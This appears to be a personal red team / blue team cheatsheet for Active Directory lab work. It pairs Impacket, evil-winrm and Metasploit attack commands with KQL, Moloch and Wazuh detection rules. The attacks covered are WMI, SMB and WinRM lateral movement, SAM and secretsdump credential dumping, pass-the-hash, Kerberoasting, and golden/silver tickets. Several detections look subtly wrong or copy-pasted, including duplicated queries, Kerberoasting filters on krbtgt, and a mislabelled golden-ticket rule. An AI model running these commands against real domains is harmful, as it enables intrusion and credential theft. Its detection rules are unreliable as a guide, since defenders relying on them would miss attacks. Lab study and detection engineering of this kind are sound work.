This document is a cheatsheet to give solid examples of how both sides should behave while focusing around ActiveDirectory. There is common commands list for [[Red Team]] and [[Blue Team]].

**Note:** CWL Labs gives access to credentials for specific user, we don't have to break into system, we just abuse missconfiguration.
# 1. WMI Based Initial Access

ATTACKER: 

```bash
# Impacket wmiexec
impacket-wmiexec domain/user:password@target_ip
impacket-wmiexec -hashes :NTLM_HASH domain/user@target_ip

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass domain/user@target_ip

# Command execution
impacket-wmiexec domain/admin:Pass123!@192.168.1.10 "whoami && systeminfo"
```

DEFENDER: 
1. KQL Query: 
```
event.code: 4688 and process.parent.name: "wmiprvse.exe" and process.command_line: "*cmd.exe*"
   ```
   2. Moloch 
   ```
protocol == dcerpc && service == 135
protocol == dcerpc && service == 445
ip.dst == TARGET_IP && port == 135 && bytes > 10000
   ```
     
3. Wazuh rules 
```
<group name="windows,wmi,">
  <rule id="100100" level="10">
    <field name="win.eventdata.operation">Start</field>
    <field name="win.eventdata.clientProcessId">|wmiprvse.exe|</field>
    <description>WMI Process Start - Potential Lateral Movement</description>
  </rule>
  
  <rule id="100101" level="12">
    <if_sid>100100</if_sid>
    <field name="win.eventdata.user">administrator</field>
    <description>Suspicious WMI Execution by Administrator</description>
  </rule>
</group>
```
# 2. SMB Based Initial Access
ATTACKER: 
```
# SMB share enumeration
impacket-smbclient domain/user:password@target_ip
impacket-smbclient -hashes :NTLM_HASH domain/user@target_ip

# SMB exec
impacket-smbexec domain/admin:Pass123!@192.168.1.10

# Share mounting
net use \\192.168.1.10\C$ /user:domain\user password
```
D3FENDER:
1. KQL Query
```
event.code: 5140 and share.name: "*$" and network.forwarded_ip: "192.168.1.*"
```
2. Moloch
```
protocol == smb && smb.command == 0x75
smb.filename == "*.exe" or smb.filename == "*.dll"
smb.filename contains "temp" or smb.filename contains "tmp"
```
2. Wazuh Rules 
```
<group name="windows,smb,">
  <rule id="100200" level="10">
    <field name="win.eventdata.shareName">\\*\C$</field>
    <field name="win.eventdata.ipAddress">!127.0.0.1</field>
    <description>Suspicious Administrative Share Access</description>
  </rule>
  
  <rule id="100201" level="12">
    <if_sid>100200</if_sid>
    <field name="win.eventdata.subjectUserName">administrator</field>
    <description>Admin Share Access by Administrator from Remote</description>
  </rule>
</group>
```
# 3. WinRM Based Initial Access

ATTACKER: 
```
# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -p Password123
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# Impacket winrm
impacket-winrm domain/user:password@target_ip

# PowerShell Remoting
Enter-PSSession -ComputerName target_ip -Credential domain\user
```

D3F3NDER: 
1. KQL: 
  ```
   event.code: 4624 and logon.type: 3 and service.name: "WinRM" and @timestamp >= now-5m
   ```
   2. Moloch
```
protocol == http && port == 5985
http.user-agent contains "WinRM" or http.user-agent contains "evil-winrm"
http.request.uri == "/wsman" and http.request.body contains "Invoke-Command"
```
3. ELK Rule: 
```
<group name="windows,winrm,">
  <rule id="100300" level="10">
    <field name="win.eventdata.serviceName">WinRM</field>
    <field name="win.eventdata.ipAddress">!192.168.1.0/24</field>
    <description>WinRM Access from Untrusted Network</description>
  </rule>
  
  <rule id="100301" level="12">
    <if_sid>100300</if_sid>
    <field name="win.eventdata.logonType">3</field>
    <description>Network WinRM Logon Type 3</description>
  </rule>
</group>
```
# 4. Credential Dumping: LSASS & SAM
ATTACKER: 
```
# Impacket secretsdump
impacket-secretsdump domain/user:password@target_ip
impacket-secretsdump -hashes :NTLM_HASH domain/user@target_ip

# Local SAM dump
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Mimikatz-style
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

DEFENDER: 
1. KQL
```
event.code: 4663 and file.path: "*\\SAM*" and (process.name: "*mimikatz*" or process.name: "*procdump*" or process.name: "*lsass*")
```
2. Moloch 
```
protocol == smb && (smb.filename == "SAM" or smb.filename == "SYSTEM")
protocol == smb && (smb.filename contains "dump" or smb.filename contains "lsass")
bytes > 5000000 && (filename endsWith ".dmp" or filename endsWith ".save")
```
3. ELK rule
```
<group name="windows,credential_dumping,">
  <rule id="100400" level="13">
    <field name="win.eventdata.objectName">\\Device\\HarddiskVolumeShadowCopy*</field>
    <description>Volume Shadow Copy Creation - Potential Credential Dumping</description>
  </rule>
  
  <rule id="100401" level="12">
    <field name="win.eventdata.processName">reg.exe</field>
    <field name="win.eventdata.commandLine">save.*(SAM|SYSTEM|SECURITY)</field>
    <description>Suspicious Registry Export for Credential Files</description>
  </rule>
</group>
```
# 5. Pass the Hash (wmiexec)

ATTACKER: 
```
# WMI with Pass-the-Hash
impacket-wmiexec -hashes :NTLM_HASH domain/user@target_ip

# Multiple targets
for ip in $(cat targets.txt); do
    impacket-wmiexec -hashes :HASH domain/admin@$ip "whoami"
done

# With output capture
impacket-wmiexec -hashes :HASH domain/user@target_ip "cmd.exe /c ipconfig > C:\temp\out.txt"
```

D3FEND:

1. KQL Query:
```
event.code: 4624 and logon.type: 3 and auth.package: "NTLM" and process.name: "*wmiprvse*" and not host.name: "DC*"
```
2. Moloch
```
protocol == dcerpc && service == 135 && ip.src != DC_SUBNET
dcerpc.operation == "RemoteCreateInstance" or dcerpc.operation == "RemoteGetClassObject"
count by ip.src,ip.dst | count > 5
```
3. ELK rule
```
<group name="windows,pass_the_hash,">
  <rule id="100500" level="12">
    <field name="win.eventdata.logonType">3</field>
    <field name="win.eventdata.authenticationPackage">NTLM</field>
    <field name="win.eventdata.processName">wmiprvse.exe</field>
    <description>Pass-the-Hash Detection: NTLM Network Logon to WMI</description>
  </rule>
  
  <rule id="100501" level="10">
    <field name="win.eventdata.sourceAddress">!DC_IP</field>
    <field name="win.eventdata.serviceName">WMI</field>
    <description>WMI Access from Non-DC Source</description>
  </rule>
</group>
```

# 6. Pass the Key
ATTACK:
```
# Get Kerberos ticket
impacket-getTGT domain/user:password

# Export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Use ticket for authentication
impacket-wmiexec -k -no-pass domain/user@target_ip

# Alternative with AES key
impacket-wmiexec -aesKey AES_KEY domain/user@target_ip
```
I have no idea how it worked finally lmao

DEF3ND:
1. KQL Query
```
event.code: 4769 and service.name: "krbtgt" and ticket.encryption_type: 0x12 and ticket.count > 10
```
2. Moloch
```
protocol == kerberos && kerberos.msg_type == "AS-REQ"
kerberos.enc_type == "aes256-cts-hmac-sha1-96" or kerberos.enc_type == "aes128-cts-hmac-sha1-96"
count by ip.src,kerberos.cname | count > 3
```
3. ELK Rule
```
<group name="windows,pass_the_key,">
  <rule id="100600" level="12">
    <field name="win.eventdata.logonType">3</field>
    <field name="win.eventdata.authenticationPackage">Kerberos</field>
    <field name="win.eventdata.ipAddress">!DC_IP</field>
    <description>Kerberos Network Logon from Non-DC - Potential Pass-the-Key</description>
  </rule>
  
  <rule id="100601" level="10">
    <field name="win.eventdata.ticketOptions">0x40810000</field>
    <description>Kerberos Ticket with Forwardable Flag Set</description>
  </rule>
</group>
```

# 7. Kerberoasting
ATTACKER:
```
# Impacket GetUserSPNs
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request

# Output to file
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Specific user
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request-user sql_service

# Metasploit
msfconsole
use auxiliary/gather/kerberoast
set rhosts DC_IP
set domain DOMAIN
set username user
set password password
run
```

D3FeND:

1. KQL Query 
```
event.code: 4769 and ticket.encryption_type: "0x17" and service.name: "krbtgt/*" and @timestamp >= now-1h
```
2. Moloch
```
event.code: 4769 and ticket.encryption_type: "0x17" and service.name: "krbtgt/*" and @timestamp >= now-1h
```
3. ELK Rule: 
```
<group name="windows,kerberoasting,">
  <rule id="100700" level="12">
    <field name="win.eventdata.serviceName">krbtgt/*</field>
    <field name="win.eventdata.ticketEncryptionType">0x17</field>
    <description>Kerberoasting Detection: RC4 Encryption for TGS</description>
  </rule>
  
  <rule id="100701" level="10">
    <field name="win.eventdata.serviceTicketRequests">10</field>
    <field name="win.eventdata.timeRange">3600</field>
    <description>Excessive TGS Requests in Short Timeframe</description>
  </rule>
</group>
```

# 8. Golden & Silver Ticket
ATTACKER:
```
# Golden Ticket - get krbtgt hash first
impacket-secretsdump domain/admin:password@DC_IP

# Create golden ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Use golden ticket
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass domain.local/administrator@target_ip

# Silver Ticket for specific service
impacket-ticketer -nthash MACHINE_HASH -domain-sid DOMAIN_SID -domain domain.local -spn cifs/target_host.domain.local administrator
```

D3F3ND:
1. KQL Query: 
```
event.code: 4769 and ticket.lifetime > 43200 and (service.name: "krbtgt/*" or ticket.encryption_type: "0x17")
```
2. Moloch
```
kerberos.ticket_lifetime > 43200
kerberos.msg_type == "TGS-REP" and kerberos.error_code != 0
count by kerberos.ticket | count > 1
```
3. ELK Rule:
```
<group name="windows,golden_ticket,">
  <rule id="100800" level="13">
    <field name="win.eventdata.logonHours">*</field>
    <field name="win.eventdata.status">0x0</field>
    <field name="win.eventdata.subStatus">0xC000006D</field>
    <description>Golden Ticket Detection: Logon Outside Business Hours</description>
  </rule>
  
  <rule id="100801" level="12">
    <field name="win.eventdata.serviceName">krbtgt</field>
    <field name="win.eventdata.ticketOptions">0x60a10000</field>
    <description>Suspicious Kerberos Ticket Options - Potential Golden Ticket</description>
  </rule>
</group>
```
# 9. SID History Injection: Child to Parent Escalation
1. KQL Query: 
```
(event.code: 4765 or event.code: 4766) and (user.sid: "S-1-5-21-*-519" or user.sid: "S-1-5-21-*-512")
```
2. Moloch
```
protocol == ldap && ldap.operation == "modify"
ldap.modification contains "sIDHistory" or ldap.modification contains "adminCount"
ldap.base_dn contains "DC=otherdomain" and ip.src != DC_SUBNET
```
3. Rule Creation:
```
<group name="windows,sid_history,">
  <rule id="100900" level="13">
    <field name="win.eventdata.subjectUserName">*$</field>
    <field name="win.eventdata.operationType">%%4738</field>
    <description>SID History Modification - Potential Privilege Escalation</description>
  </rule>
  
  <rule id="100901" level="12">
    <field name="win.eventdata.memberSid">S-1-5-21-*-519</field>
    <field name="win.eventdata.targetSid">S-1-5-21-*-*</field>
    <description>Cross-Domain SID Addition - Potential SID History Attack</description>
  </rule>
</group>
```

# PRO TIPS/Threat Hunting Tips 
#queries #kql #kqlAD #AD 

Ofc replace event.code with event.ID or *data.win.system.eventID : 1234* , depends. 
```
(event.code: 4625 or event.code: 4648 or event.code: 4672 or event.code: 4769) and @timestamp >= now-15m
```

Detecting multiple attack patterns long query: 
```
// Detect multiple attack patterns ez mode 
let suspicious_events = dynamic([4625, 4648, 4672, 4769, 5140]);
SecurityEvent
| where EventID in (suspicious_events)
| where TimeGenerated >= ago(1h)
| summarize EventCount = count() by EventID, Computer, Account
| where EventCount > 5
```

Rootkit detection with ELK:
```
<group name="syscheck,rootkit,">
  <rule id="510" level="7">
    <if_sid>507,508,509</if_sid>
    <field name="file">/tmp/mimikatz</field>
    <description>File modified or created by mimikatz</description>
  </rule>
</group>
```
